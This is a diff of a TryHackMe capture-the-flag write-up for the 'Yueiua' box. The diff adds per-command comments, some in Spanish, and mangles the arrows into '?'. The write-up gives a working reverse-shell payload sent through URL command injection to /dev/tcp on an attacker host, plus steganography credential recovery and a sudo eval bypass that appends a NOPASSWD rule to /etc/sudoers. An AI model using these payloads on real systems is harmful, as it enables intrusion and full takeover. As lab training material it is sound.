@@ -1,43 +1,43 @@
-﻿# Yueiua — TryHackMe Writeup
+# Yueiua  TryHackMe Writeup
 
 **Target:** `TARGET_IP` (10.129.177.253 at time of solve)
 **OS:** Linux (Ubuntu 20.04)
 **Difficulty:** Easy
 **Tech stack:** Apache 2.4.41, custom PHP
-**Exploit chain:** URL-parameter OS command injection → `www-data` shell → base64 passphrase + image steghide → SSH as `deku` → sudo bash-eval filter bypass → `/etc/sudoers` append → root
+**Exploit chain:** URL-parameter OS command injection ? `www-data` shell ? base64 passphrase + image steghide ? SSH as `deku` ? sudo bash-eval filter bypass ? `/etc/sudoers` append ? root
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap → 22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41
-    ↓
-whatweb → email info@yuei.ac.jp (user hint)
-    ↓
-feroxbuster → /assets/index.php
-    ↓
-?cmd=whoami → base64("www-data") → OS command injection
-    ↓
+nmap ? 22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41
+    ?
+whatweb ? email info@yuei.ac.jp (user hint)
+    ?
+feroxbuster ? /assets/index.php
+    ?
+?cmd=whoami ? base64("www-data") ? OS command injection
+    ?
 Reverse shell via /usr/bin/bash -c (URL-encoded)
-    ↓
-cd /Hidden_Content → passphrase.txt (base64 → AllmightForEver!!!)
-    ↓
-wget /assets/images/oneforall.jpg → file says "data"
-    ↓
-exiftool → PNG magic corrupted → printf '\xFF\xD8' | dd → fix JPEG magic
-    ↓
-steghide extract → creds.txt → deku SSH creds
-    ↓
+    ?
+cd /Hidden_Content ? passphrase.txt (base64 ? AllmightForEver!!!)
+    ?
+wget /assets/images/oneforall.jpg ? file says "data"
+    ?
+exiftool ? PNG magic corrupted ? printf '\xFF\xD8' | dd ? fix JPEG magic
+    ?
+steghide extract ? creds.txt ? deku SSH creds
+    ?
 ssh deku@$TARGET
-    ↓
-sudo -l → (ALL) /opt/NewComponent/feedback.sh
-    ↓
-feedback.sh eval blacklist → '>' redirection not blocked
-    ↓
+    ?
+sudo -l ? (ALL) /opt/NewComponent/feedback.sh
+    ?
+feedback.sh eval blacklist ? '>' redirection not blocked
+    ?
 Payload: "deku ALL=NOPASSWD: ALL >> /etc/sudoers"
-    ↓
-sudo su - → root.txt
+    ?
+sudo su - ? root.txt
 ```
 
 ---
@@ -45,10 +45,10 @@ sudo su - → root.txt
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
 2. [Web Enumeration](#2-web-enumeration)
-3. [Initial Access — URL-Parameter Command Injection](#3-initial-access--url-parameter-command-injection)
+3. [Initial Access  URL-Parameter Command Injection](#3-initial-access--url-parameter-command-injection)
 4. [Post-Exploitation (`www-data`)](#4-post-exploitation-www-data)
-5. [User — Image Steganography Loot](#5-user--image-steganography-loot)
-6. [Privilege Escalation — Bash Eval Filter Bypass](#6-privilege-escalation--bash-eval-filter-bypass)
+5. [User  Image Steganography Loot](#5-user--image-steganography-loot)
+6. [Privilege Escalation  Bash Eval Filter Bypass](#6-privilege-escalation--bash-eval-filter-bypass)
 7. [Root Flag](#7-root-flag)
 8. [Key Takeaways](#8-key-takeaways)
 
@@ -57,6 +57,8 @@ sudo su - → root.txt
 ## 1. Reconnaissance
 
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,80 $TARGET -oA service
 ```
@@ -64,7 +66,7 @@ nmap -sVC -p22,80 $TARGET -oA service
 | Port | Service |
 |------|---------|
 | 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
-| 80/tcp | Apache httpd 2.4.41 (Ubuntu) — title *U.A. High School* |
+| 80/tcp | Apache httpd 2.4.41 (Ubuntu)  title *U.A. High School* |
 
 See [nmap.md](../../tools/recon/nmap.md).
 
@@ -74,7 +76,9 @@ See [nmap.md](../../tools/recon/nmap.md).
 
 ```bash
 whatweb http://$TARGET
-# Email[info@yuei.ac.jp]    ← noted for later
+# Email[info@yuei.ac.jp]    ? noted for later
+# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
+# Why here: descubrir endpoints ocultos que abren la siguiente fase.
 feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html
 ```
 
@@ -87,13 +91,17 @@ Tools: [whatweb](../../tools/recon/whatweb.md), [feroxbuster](../../tools/fuzz/f
 
 ---
 
-## 3. Initial Access — URL-Parameter Command Injection
+## 3. Initial Access  URL-Parameter Command Injection
 
 Full technique: [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
 
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://$TARGET/assets/index.php?cmd=whoami"
 # d3d3LWRhdGEK
+# What it does: decodes or encodes Base64 data.
+# Why here: convertir loot codificado en texto utilizable.
 echo 'd3d3LWRhdGEK' | base64 -d
 # www-data
 ```
@@ -101,13 +109,19 @@ echo 'd3d3LWRhdGEK' | base64 -d
 Response is base64-wrapped. Reverse shell:
 ```bash
 # Attacker
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 4444
 
 # Target (URL-encoded)
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
 ```
 
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -118,36 +132,52 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).
 
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /etc/passwd | grep bash
 # root:x:0:0:root:/root:/bin/bash
 # deku:x:1000:1000:deku:/home/deku:/bin/bash
 # ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
 
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -type f -executable -user deku 2>/dev/null
-# /opt/NewComponent/feedback.sh     ← pin for privesc
+# /opt/NewComponent/feedback.sh     ? pin for privesc
 ```
 
 Hidden directory from `cd /`:
 ```bash
+# What it does: lists directory contents.
+# Why here: verificar archivos, permisos o loot en la ruta actual.
 ls /
 # ... Hidden_Content ...
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /Hidden_Content/passphrase.txt
 # QWxsbWlnaHRGb3JFdmVyISEh
+# What it does: decodes or encodes Base64 data.
+# Why here: convertir loot codificado en texto utilizable.
 echo 'QWxsbWlnaHRGb3JFdmVyISEh' | base64 -d
 # AllmightForEver!!!
 ```
 
 ---
 
-## 5. User — Image Steganography Loot
+## 5. User  Image Steganography Loot
 
 Full technique: [steganography-image-loot.md](../../exploits/stego/steganography-image-loot.md).
 
 ```bash
+# What it does: downloads the specified URL to disk.
+# Why here: bring evidence, payloads or files needed to advance.
 wget http://$TARGET/assets/images/oneforall.jpg
+# What it does: identifies file type and metadata.
+# Why here: choose the correct parser or technique.
 file oneforall.jpg
-# oneforall.jpg: data             ← magic is broken
+# oneforall.jpg: data             ? magic is broken
 
+# What it does: inspects or extracts hidden content/metadata from a file.
+# Why here: recover clues or credentials hidden in assets.
 exiftool oneforall.jpg
 # Warning: PNG image did not start with IHDR
 ```
@@ -159,12 +189,20 @@ printf '\xFF\xD8' | dd of=oneforall.jpg bs=1 count=2 conv=notrunc
 
 Extract with the passphrase from §4:
 ```bash
+# What it does: inspects or extracts hidden content/metadata from a file.
+# Why here: recover clues or credentials hidden in assets.
 steghide extract -sf oneforall.jpg
 # Enter passphrase: AllmightForEver!!!
 # wrote extracted data to "creds.txt"
 
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat creds.txt       # deku SSH credentials
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh deku@$TARGET
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /home/deku/user.txt
 ```
 
@@ -172,13 +210,17 @@ Tools: [exiftool](../../tools/web/exiftool.md), [steghide](../../tools/stego/ste
 
 ---
 
-## 6. Privilege Escalation — Bash Eval Filter Bypass
+## 6. Privilege Escalation  Bash Eval Filter Bypass
 
 Full technique: [bash-eval-filter-bypass.md](../../exploits/privesc-linux/bash-eval-filter-bypass.md).
 
 ```bash
+# What it does: lists sudo privileges of the current or specified user.
+# Why here: encontrar comandos permitidos para escalar privilegios.
 sudo -l
 # (ALL) /opt/NewComponent/feedback.sh
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /opt/NewComponent/feedback.sh
 ```
 
@@ -195,14 +237,18 @@ fi
 Blacklist covers command substitution but **not `>>`**. Payload:
 
 ```bash
+# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
+# Why here: disparar la primitiva de privesc encontrada con sudo -l.
 sudo /opt/NewComponent/feedback.sh
 # Enter your feedback:
 deku ALL=NOPASSWD: ALL >> /etc/sudoers
 ```
 
-`eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"` — the shell expands `>>` and appends the line as root.
+`eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"`  the shell expands `>>` and appends the line as root.
 
 ```bash
+# What it does: lists sudo privileges of the current or specified user.
+# Why here: encontrar comandos permitidos para escalar privilegios.
 sudo -l              # deku may now run anything
 sudo su -
 ```
@@ -212,6 +258,8 @@ sudo su -
 ## 7. Root Flag
 
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /root/root.txt
 ```
 
@@ -219,19 +267,21 @@ cat /root/root.txt
 
 ## 8. Key Takeaways
 
-- `file <x>` before any image tool — extension and even metadata lie; magic bytes don't.
+- `file <x>` before any image tool  extension and even metadata lie; magic bytes don't.
 - Corrupted magic bytes are a red flag, not a broken file. Fix with `printf '\xXX\xYY' | dd of=<file> bs=1 count=N conv=notrunc` and try the tool again.
 - `exiftool` first, `steghide` second. Passphrase is nearly always elsewhere on the box (`grep -rEi 'pass' /home /opt /tmp`).
-- Blacklist-based shell filters that allow `>` / `>>` are trivially bypassable — redirect into `/etc/sudoers`, `/root/.ssh/authorized_keys`, or any cron helper.
-- On base64-wrapped RCE endpoints, pipe every response through `base64 -d` immediately — don't waste time troubleshooting "empty" responses.
+- Blacklist-based shell filters that allow `>` / `>>` are trivially bypassable  redirect into `/etc/sudoers`, `/root/.ssh/authorized_keys`, or any cron helper.
+- On base64-wrapped RCE endpoints, pipe every response through `base64 -d` immediately  don't waste time troubleshooting "empty" responses.
 
 ---
 
 ## Related Notes
-- [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md) — initial RCE
-- [steganography-image-loot.md](../../exploits/stego/steganography-image-loot.md) — user flag chain
-- [bash-eval-filter-bypass.md](../../exploits/privesc-linux/bash-eval-filter-bypass.md) — root privesc
-- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md) — post-foothold checklist
-- [nmap](../../tools/recon/nmap.md), [whatweb](../../tools/recon/whatweb.md), [feroxbuster](../../tools/fuzz/feroxbuster.md) — recon
-- [curl](../../tools/web/curl.md), [netcat](../../tools/pivot/netcat.md) — exploitation
-- [exiftool](../../tools/web/exiftool.md), [steghide](../../tools/stego/steghide.md), [wget](../../tools/web/wget.md) — stego loot
+- [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md)  initial RCE
+- [steganography-image-loot.md](../../exploits/stego/steganography-image-loot.md)  user flag chain
+- [bash-eval-filter-bypass.md](../../exploits/privesc-linux/bash-eval-filter-bypass.md)  root privesc
+- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  post-foothold checklist
+- [nmap](../../tools/recon/nmap.md), [whatweb](../../tools/recon/whatweb.md), [feroxbuster](../../tools/fuzz/feroxbuster.md)  recon
+- [curl](../../tools/web/curl.md), [netcat](../../tools/pivot/netcat.md)  exploitation
+- [exiftool](../../tools/web/exiftool.md), [steghide](../../tools/stego/steghide.md), [wget](../../tools/web/wget.md)  stego loot
+
+
